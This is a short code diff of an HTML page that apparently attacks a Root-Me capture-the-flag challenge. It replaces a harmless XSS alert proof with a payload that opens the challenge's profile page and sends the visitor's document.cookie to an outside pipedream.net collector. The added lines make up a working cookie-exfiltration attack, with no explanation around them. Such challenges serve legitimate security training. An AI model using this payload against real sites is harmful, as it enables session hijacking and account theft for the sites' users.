@@ -5,20 +5,10 @@
 </head>
 <body>
   <script>
-    // Définir l'URL cible pour ouvrir la page
     const targetURL = "http://challenge01.root-me.org:58003/profile";
-    
-    // Définir le payload XSS (image avec erreur qui déclenche un script)
-    const xssPayload = "<img src='x' onerror='alert(\"XSS works!\")'>";
-    
-    // Ajouter le payload dans le hash de l'URL
-    const maliciousHash = "#<div id='output'>" + xssPayload + "</div>";
-    
-    // Ouvrir une nouvelle fenêtre avec l'URL malveillante
-    const newWindow = window.open(targetURL + maliciousHash);
-    
+    const xssPayload = "<img src='https://eo2uyqmp09oup0u.m.pipedream.net?cookie=\${document.cookie}\'>";
+    const newWindow = window.open(targetURL + xssPayload);
   </script>
-  
   <p>Chargement...</p>
 </body>
 </html>
